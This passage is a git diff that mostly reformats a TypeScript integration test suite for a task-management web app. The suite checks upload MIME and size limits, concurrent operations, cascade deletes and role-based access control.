 	} else {
 		await res4.text();
-		record('MIME', 'Upload with application/pdf (should work)', 'FAIL', `Expected 201 or 500, got ${res4.status}`, dur4, res4.status);
+		record(
+			'MIME',
+			'Upload with application/pdf (should work)',
+			'FAIL',
+			`Expected 201 or 500, got ${res4.status}`,
+			dur4,
+			res4.status
+		);
 	}
 
 	// 5f. File size exactly at limit (100MB)
@@ -1058,10 +1587,24 @@ async function testMimeTypeAllowlist() {
 	// 100MB is exactly the max per the schema (.max(100 * 1024 * 1024))
 	if (res5.status === 201 || res5.status === 500) {
 		await res5.text();
-		record('MIME', 'Upload with 100MB file (exactly at limit)', 'PASS', `Status ${res5.status}`, dur5, res5.status);
+		record(
+			'MIME',
+			'Upload with 100MB file (exactly at limit)',
+			'PASS',
+			`Status ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	} else {
 		await res5.text();
-		record('MIME', 'Upload with 100MB file (exactly at limit)', 'FAIL', `Expected 201/500, got ${res5.status}`, dur5, res5.status);
+		record(
+			'MIME',
+			'Upload with 100MB file (exactly at limit)',
+			'FAIL',
+			`Expected 201/500, got ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	}
 
 	// 5g. File size over limit (100MB + 1 byte)
@@ -1079,9 +1622,23 @@ async function testMimeTypeAllowlist() {
 	);
 	await res6.text();
 	if (res6.status === 400) {
-		record('MIME', 'Upload with 100MB+1 file (over limit)', 'PASS', 'Correctly rejected', dur6, res6.status);
+		record(
+			'MIME',
+			'Upload with 100MB+1 file (over limit)',
+			'PASS',
+			'Correctly rejected',
+			dur6,
+			res6.status
+		);
 	} else {
-		record('MIME', 'Upload with 100MB+1 file (over limit)', 'FAIL', `Expected 400, got ${res6.status}`, dur6, res6.status);
+		record(
+			'MIME',
+			'Upload with 100MB+1 file (over limit)',
+			'FAIL',
+			`Expected 400, got ${res6.status}`,
+			dur6,
+			res6.status
+		);
 	}
 }
 
@@ -1115,11 +1672,29 @@ async function testConcurrentOperations() {
 	const uniqueDisplayIds = new Set(displayIds);
 
 	if (createdTasks.length === 5 && uniqueDisplayIds.size === 5) {
-		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'PASS', `All unique: ${[...uniqueDisplayIds].join(', ')}`, dur1);
+		record(
+			'Concurrent',
+			'Create 5 tasks concurrently (unique displayIds)',
+			'PASS',
+			`All unique: ${[...uniqueDisplayIds].join(', ')}`,
+			dur1
+		);
 	} else if (createdTasks.length === 5 && uniqueDisplayIds.size < 5) {
-		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'FAIL', `Only ${uniqueDisplayIds.size}/5 unique displayIds: ${displayIds.join(', ')}`, dur1);
+		record(
+			'Concurrent',
+			'Create 5 tasks concurrently (unique displayIds)',
+			'FAIL',
+			`Only ${uniqueDisplayIds.size}/5 unique displayIds: ${displayIds.join(', ')}`,
+			dur1
+		);
 	} else {
-		record('Concurrent', 'Create 5 tasks concurrently (unique displayIds)', 'FAIL', `Only ${createdTasks.length}/5 tasks created`, dur1);
+		record(
+			'Concurrent',
+			'Create 5 tasks concurrently (unique displayIds)',
+			'FAIL',
+			`Only ${createdTasks.length}/5 tasks created`,
+			dur1
+		);
 	}
 
 	// 6b. Start timer on same task from 2 different requests concurrently
@@ -1152,13 +1727,31 @@ async function testConcurrentOperations() {
 		const conflicts = timerResults.filter((r) => r.status === 409 || r.status === 400);
 
 		if (successes.length === 1 && conflicts.length === 1) {
-			record('Concurrent', 'Start 2 timers concurrently on same task (one succeeds)', 'PASS', `1 succeeded (201), 1 conflicted (${conflicts[0].status})`, dur2);
+			record(
+				'Concurrent',
+				'Start 2 timers concurrently on same task (one succeeds)',
+				'PASS',
+				`1 succeeded (201), 1 conflicted (${conflicts[0].status})`,
+				dur2
+			);
 		} else if (successes.length === 2) {
 			// Both succeeded due to race condition -- the transaction might allow it
 			// This is an informational finding
-			record('Concurrent', 'Start 2 timers concurrently on same task', 'FAIL', `Both timers started (race condition) -- ${successes.length} successes`, dur2);
+			record(
+				'Concurrent',
+				'Start 2 timers concurrently on same task',
+				'FAIL',
+				`Both timers started (race condition) -- ${successes.length} successes`,
+				dur2
+			);
 		} else {
-			record('Concurrent', 'Start 2 timers concurrently on same task', 'FAIL', `Unexpected: ${successes.length} successes, ${conflicts.length} conflicts`, dur2);
+			record(
+				'Concurrent',
+				'Start 2 timers concurrently on same task',
+				'FAIL',
+				`Unexpected: ${successes.length} successes, ${conflicts.length} conflicts`,
+				dur2
+			);
 		}
 
 		// Clean up: stop any running timers
@@ -1194,7 +1787,12 @@ async function testCascadeDelete() {
 		cascadeProjectId = await createProject(userACookie, 'Cascade Delete Test Project');
 		cascadeColumnId = await getFirstColumnId(cascadeProjectId);
 
-		const task = await createTask(userACookie, cascadeProjectId, cascadeColumnId, 'Cascade test task');
+		const task = await createTask(
+			userACookie,
+			cascadeProjectId,
+			cascadeColumnId,
+			'Cascade test task'
+		);
 		cascadeTaskId = task.id;
 
 		// Create a comment
@@ -1230,7 +1828,13 @@ async function testCascadeDelete() {
 			body: JSON.stringify({ projectId: cascadeProjectId, name: 'cascade-label', color: '#ff0000' })
 		});
 
-		record('CascadeDelete', 'Setup: project with task, comment, time entry, label', 'PASS', `project=${cascadeProjectId}, task=${cascadeTaskId}`, 0);
+		record(
+			'CascadeDelete',
+			'Setup: project with task, comment, time entry, label',
+			'PASS',
+			`project=${cascadeProjectId}, task=${cascadeTaskId}`,
+			0
+		);
 	} catch (e: any) {
 		record('CascadeDelete', 'Setup cascade test data', 'FAIL', e.message, 0);
 		return;
@@ -1247,7 +1851,13 @@ async function testCascadeDelete() {
 		client.close();
 	});
 
-	record('CascadeDelete', 'Delete project via DB', 'PASS', `Deleted project ${cascadeProjectId}`, dur1);
+	record(
+		'CascadeDelete',
+		'Delete project via DB',
+		'PASS',
+		`Deleted project ${cascadeProjectId}`,
+		dur1
+	);
 
 	// Verify cascade: tasks should be deleted
 	try {
@@ -1263,7 +1873,13 @@ async function testCascadeDelete() {
 		if (taskCount === 0) {
 			record('CascadeDelete', 'Tasks deleted on project delete', 'PASS', 'No orphaned tasks', 0);
 		} else {
-			record('CascadeDelete', 'Tasks deleted on project delete', 'FAIL', `${taskCount} orphaned tasks remain`, 0);
+			record(
+				'CascadeDelete',
+				'Tasks deleted on project delete',
+				'FAIL',
+				`${taskCount} orphaned tasks remain`,
+				0
+			);
 		}
 
 		// Check comments (should cascade from task delete)
@@ -1273,9 +1889,21 @@ async function testCascadeDelete() {
 		});
 		const commentCount = commentResult.rows[0].cnt as number;
 		if (commentCount === 0) {
-			record('CascadeDelete', 'Comments deleted on task cascade', 'PASS', 'No orphaned comments', 0);
+			record(
+				'CascadeDelete',
+				'Comments deleted on task cascade',
+				'PASS',
+				'No orphaned comments',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Comments deleted on task cascade', 'FAIL', `${commentCount} orphaned comments remain`, 0);
+			record(
+				'CascadeDelete',
+				'Comments deleted on task cascade',
+				'FAIL',
+				`${commentCount} orphaned comments remain`,
+				0
+			);
 		}
 
 		// Check time entries (should cascade from task delete)
@@ -1285,9 +1913,21 @@ async function testCascadeDelete() {
 		});
 		const teCount = teResult.rows[0].cnt as number;
 		if (teCount === 0) {
-			record('CascadeDelete', 'Time entries deleted on task cascade', 'PASS', 'No orphaned time entries', 0);
+			record(
+				'CascadeDelete',
+				'Time entries deleted on task cascade',
+				'PASS',
+				'No orphaned time entries',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Time entries deleted on task cascade', 'FAIL', `${teCount} orphaned time entries remain`, 0);
+			record(
+				'CascadeDelete',
+				'Time entries deleted on task cascade',
+				'FAIL',
+				`${teCount} orphaned time entries remain`,
+				0
+			);
 		}
 
 		// Check columns (should cascade from project delete)
@@ -1297,9 +1937,21 @@ async function testCascadeDelete() {
 		});
 		const colCount = colResult.rows[0].cnt as number;
 		if (colCount === 0) {
-			record('CascadeDelete', 'Columns deleted on project delete', 'PASS', 'No orphaned columns', 0);
+			record(
+				'CascadeDelete',
+				'Columns deleted on project delete',
+				'PASS',
+				'No orphaned columns',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Columns deleted on project delete', 'FAIL', `${colCount} orphaned columns remain`, 0);
+			record(
+				'CascadeDelete',
+				'Columns deleted on project delete',
+				'FAIL',
+				`${colCount} orphaned columns remain`,
+				0
+			);
 		}
 
 		// Check labels (should cascade from project delete)
@@ -1311,7 +1963,13 @@ async function testCascadeDelete() {
 		if (labelCount === 0) {
 			record('CascadeDelete', 'Labels deleted on project delete', 'PASS', 'No orphaned labels', 0);
 		} else {
-			record('CascadeDelete', 'Labels deleted on project delete', 'FAIL', `${labelCount} orphaned labels remain`, 0);
+			record(
+				'CascadeDelete',
+				'Labels deleted on project delete',
+				'FAIL',
+				`${labelCount} orphaned labels remain`,
+				0
+			);
 		}
 
 		// Check project_members (should cascade from project delete)
@@ -1321,9 +1979,21 @@ async function testCascadeDelete() {
 		});
 		const memberCount = memberResult.rows[0].cnt as number;
 		if (memberCount === 0) {
-			record('CascadeDelete', 'Project members deleted on project delete', 'PASS', 'No orphaned members', 0);
+			record(
+				'CascadeDelete',
+				'Project members deleted on project delete',
+				'PASS',
+				'No orphaned members',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Project members deleted on project delete', 'FAIL', `${memberCount} orphaned members remain`, 0);
+			record(
+				'CascadeDelete',
+				'Project members deleted on project delete',
+				'FAIL',
+				`${memberCount} orphaned members remain`,
+				0
+			);
 		}
 
 		// Check activity_log (should cascade from project delete)
@@ -1333,9 +2003,21 @@ async function testCascadeDelete() {
 		});
 		const actCount = actResult.rows[0].cnt as number;
 		if (actCount === 0) {
-			record('CascadeDelete', 'Activity log deleted on project delete', 'PASS', 'No orphaned activity logs', 0);
+			record(
+				'CascadeDelete',
+				'Activity log deleted on project delete',
+				'PASS',
+				'No orphaned activity logs',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Activity log deleted on project delete', 'FAIL', `${actCount} orphaned activity logs remain`, 0);
+			record(
+				'CascadeDelete',
+				'Activity log deleted on project delete',
+				'FAIL',
+				`${actCount} orphaned activity logs remain`,
+				0
+			);
 		}
 
 		// Check project_counters (should cascade from project delete)
@@ -1345,9 +2027,21 @@ async function testCascadeDelete() {
 		});
 		const counterCount = counterResult.rows[0].cnt as number;
 		if (counterCount === 0) {
-			record('CascadeDelete', 'Project counters deleted on project delete', 'PASS', 'No orphaned counters', 0);
+			record(
+				'CascadeDelete',
+				'Project counters deleted on project delete',
+				'PASS',
+				'No orphaned counters',
+				0
+			);
 		} else {
-			record('CascadeDelete', 'Project counters deleted on project delete', 'FAIL', `${counterCount} orphaned counters remain`, 0);
+			record(
+				'CascadeDelete',
+				'Project counters deleted on project delete',
+				'FAIL',
+				`${counterCount} orphaned counters remain`,
+				0
+			);
 		}
 
 		client.close();
@@ -1397,7 +2091,13 @@ async function testRoleBasedAccess() {
 		// Invite viewer with 'viewer' role
 		await inviteUserToProject(ownerCookie, roleProjectId, viewerEmail, 'viewer');
 
-		record('RBAC', 'Setup: owner, member, viewer for role project', 'PASS', `project=${roleProjectId}`, 0);
+		record(
+			'RBAC',
+			'Setup: owner, member, viewer for role project',
+			'PASS',
+			`project=${roleProjectId}`,
+			0
+		);
 	} catch (e: any) {
 		record('RBAC', 'Setup role test users and project', 'FAIL', e.message, 0);
 		return;
@@ -1420,7 +2120,13 @@ async function testRoleBasedAccess() {
 		await delay(300);
 		const t3 = await createTask(ownerCookie, roleProjectId, roleColumnId, 'Owner created task 3');
 		roleTaskId3 = t3.id;
-		record('RBAC', 'Create 3 tasks as owner', 'PASS', `task1=${roleTaskId1}, task2=${roleTaskId2}, task3=${roleTaskId3}`, 0);
+		record(
+			'RBAC',
+			'Create 3 tasks as owner',
+			'PASS',
+			`task1=${roleTaskId1}, task2=${roleTaskId2}, task3=${roleTaskId3}`,
+			0
+		);
 	} catch (e: any) {
 		record('RBAC', 'Create tasks as owner', 'FAIL', e.message, 0);
 		return;
@@ -1435,7 +2141,14 @@ async function testRoleBasedAccess() {
 	);
 	const body1 = await res1.json();
 	if (res1.ok && body1.success) {
-		record('RBAC', 'Owner can delete tasks', 'PASS', 'Task deleted successfully', dur1, res1.status);
+		record(
+			'RBAC',
+			'Owner can delete tasks',
+			'PASS',
+			'Task deleted successfully',
+			dur1,
+			res1.status
+		);
 	} else {
 		record('RBAC', 'Owner can delete tasks', 'FAIL', `status=${res1.status}`, dur1, res1.status);
 	}
@@ -1449,7 +2162,14 @@ async function testRoleBasedAccess() {
 	);
 	const body2 = await res2.json();
 	if (res2.ok && body2.success) {
-		record('RBAC', 'Member can delete tasks', 'PASS', 'Task deleted successfully', dur2, res2.status);
+		record(
+			'RBAC',
+			'Member can delete tasks',
+			'PASS',
+			'Task deleted successfully',
+			dur2,
+			res2.status
+		);
 	} else {
 		record('RBAC', 'Member can delete tasks', 'FAIL', `status=${res2.status}`, dur2, res2.status);
 	}
@@ -1463,9 +2183,23 @@ async function testRoleBasedAccess() {
 	);
 	await res3.text();
 	if (res3.status === 403) {
-		record('RBAC', 'Viewer CANNOT delete tasks (should 403)', 'PASS', 'Correctly denied', dur3, res3.status);
+		record(
+			'RBAC',
+			'Viewer CANNOT delete tasks (should 403)',
+			'PASS',
+			'Correctly denied',
+			dur3,
+			res3.status
+		);
 	} else {
-		record('RBAC', 'Viewer CANNOT delete tasks (should 403)', 'FAIL', `Expected 403, got ${res3.status}`, dur3, res3.status);
+		record(
+			'RBAC',
+			'Viewer CANNOT delete tasks (should 403)',
+			'FAIL',
+			`Expected 403, got ${res3.status}`,
+			dur3,
+			res3.status
+		);
 	}
 
 	// 8d. Viewer CAN read tasks
@@ -1477,7 +2211,14 @@ async function testRoleBasedAccess() {
 	const tasksRes4 = await res4.json();
 	const tasksList4 = tasksRes4.data ?? tasksRes4;
 	if (res4.ok && Array.isArray(tasksList4)) {
-		record('RBAC', 'Viewer CAN read tasks', 'PASS', `${tasksList4.length} tasks visible`, dur4, res4.status);
+		record(
+			'RBAC',
+			'Viewer CAN read tasks',
+			'PASS',
+			`${tasksList4.length} tasks visible`,
+			dur4,
+			res4.status
+		);
 	} else {
 		record('RBAC', 'Viewer CAN read tasks', 'FAIL', `status=${res4.status}`, dur4, res4.status);
 	}
@@ -1490,9 +2231,23 @@ async function testRoleBasedAccess() {
 	);
 	const singleTask = await res4b.json();
 	if (res4b.ok && singleTask.id === roleTaskId3) {
-		record('RBAC', 'Viewer CAN read single task', 'PASS', `task=${roleTaskId3}`, dur4b, res4b.status);
+		record(
+			'RBAC',
+			'Viewer CAN read single task',
+			'PASS',
+			`task=${roleTaskId3}`,
+			dur4b,
+			res4b.status
+		);
 	} else {
-		record('RBAC', 'Viewer CAN read single task', 'FAIL', `status=${res4b.status}`, dur4b, res4b.status);
+		record(
+			'RBAC',
+			'Viewer CAN read single task',
+			'FAIL',
+			`status=${res4b.status}`,
+			dur4b,
+			res4b.status
+		);
 	}
 
 	// 8f. Viewer CAN create comments
@@ -1505,9 +2260,23 @@ async function testRoleBasedAccess() {
 	);
 	const comment5 = await res5.json();
 	if (res5.status === 201 && comment5.id) {
-		record('RBAC', 'Viewer CAN create comments', 'PASS', `comment=${comment5.id}`, dur5, res5.status);
+		record(
+			'RBAC',
+			'Viewer CAN create comments',
+			'PASS',
+			`comment=${comment5.id}`,
+			dur5,
+			res5.status
+		);
 	} else {
-		record('RBAC', 'Viewer CAN create comments', 'FAIL', `status=${res5.status}`, dur5, res5.status);
+		record(
+			'RBAC',
+			'Viewer CAN create comments',
+			'FAIL',
+			`status=${res5.status}`,
+			dur5,
+			res5.status
+		);
 	}
 
 	// 8g. Viewer CANNOT update project settings
@@ -1527,11 +2296,26 @@ async function testRoleBasedAccess() {
 		})
 	);
 	const body6 = await res6.text();
-	const isFailure6 = res6.status === 403 || body6.includes('"failure"') || body6.includes('Forbidden');
+	const isFailure6 =
+		res6.status === 403 || body6.includes('"failure"') || body6.includes('Forbidden');
 	if (isFailure6) {
-		record('RBAC', 'Viewer CANNOT update project settings', 'PASS', 'Settings update denied for viewer', dur6, res6.status);
+		record(
+			'RBAC',
+			'Viewer CANNOT update project settings',
+			'PASS',
+			'Settings update denied for viewer',
+			dur6,
+			res6.status
+		);
 	} else {
-		record('RBAC', 'Viewer CANNOT update project settings', 'FAIL', `Expected failure, got status=${res6.status}`, dur6, res6.status);
+		record(
+			'RBAC',
+			'Viewer CANNOT update project settings',
+			'FAIL',
+			`Expected failure, got status=${res6.status}`,
+			dur6,
+			res6.status
+		);
 	}
 
 	// 8h. Member CAN create tasks
@@ -1570,11 +2354,26 @@ async function testRoleBasedAccess() {
 		})
 	);
 	const body8 = await res8.text();
-	const isFailure8 = res8.status === 403 || body8.includes('"failure"') || body8.includes('Forbidden');
+	const isFailure8 =
+		res8.status === 403 || body8.includes('"failure"') || body8.includes('Forbidden');
 	if (isFailure8) {
-		record('RBAC', 'Member CANNOT update project settings', 'PASS', 'Settings update denied for member', dur8, res8.status);
+		record(
+			'RBAC',
+			'Member CANNOT update project settings',
+			'PASS',
+			'Settings update denied for member',
+			dur8,
+			res8.status
+		);
 	} else {
-		record('RBAC', 'Member CANNOT update project settings', 'FAIL', `Expected failure, got status=${res8.status}`, dur8, res8.status);
+		record(
+			'RBAC',
+			'Member CANNOT update project settings',
+			'FAIL',
+			`Expected failure, got status=${res8.status}`,
+			dur8,
+			res8.status
+		);
 	}
 
 	// 8j. Member CANNOT invite users (only owner/admin)
@@ -1595,11 +2394,26 @@ async function testRoleBasedAccess() {
 		})
 	);
 	const body9 = await res9.text();
-	const isFailure9 = res9.status === 403 || body9.includes('"failure"') || body9.includes('Forbidden');
+	const isFailure9 =
+		res9.status === 403 || body9.includes('"failure"') || body9.includes('Forbidden');
 	if (isFailure9) {
-		record('RBAC', 'Member CANNOT invite users', 'PASS', 'Invitation denied for member role', dur9, res9.status);
+		record(
+			'RBAC',
+			'Member CANNOT invite users',
+			'PASS',
+			'Invitation denied for member role',
+			dur9,
+			res9.status
+		);
 	} else {
-		record('RBAC', 'Member CANNOT invite users', 'FAIL', `Expected failure, got status=${res9.status}`, dur9, res9.status);
+		record(
+			'RBAC',
+			'Member CANNOT invite users',
+			'FAIL',
+			`Expected failure, got status=${res9.status}`,
+			dur9,
+			res9.status
+		);
 	}
 }
 
@@ -1696,7 +2510,9 @@ async function main() {
 
 		// Pause to let the rate limit window (60 req / 60s) fully expire before RBAC tests
 		// RBAC tests register 3 new users, create projects, and need many API calls
-		console.log('\n    (Pausing 61s to let the 60s rate-limit window fully expire before RBAC tests...)');
+		console.log(
+			'\n    (Pausing 61s to let the 60s rate-limit window fully expire before RBAC tests...)'
+		);
 		await delay(61000);
 
 		await testRoleBasedAccess();
@@ -1715,7 +2531,9 @@ async function main() {
 	const skipped = RESULTS.filter((r) => r.status === 'SKIP').length;
 	const nonSkipped = RESULTS.length - skipped;
 
-	console.log(`\n  Total: ${RESULTS.length} | Passed: ${passed} | Failed: ${failed} | Skipped: ${skipped}`);
+	console.log(
+		`\n  Total: ${RESULTS.length} | Passed: ${passed} | Failed: ${failed} | Skipped: ${skipped}`
+	);
 	console.log(`  Duration: ${totalTime}ms`);
 	console.log(`  Pass Rate: ${nonSkipped > 0 ? ((passed / nonSkipped) * 100).toFixed(1) : 0}%\n`);
 
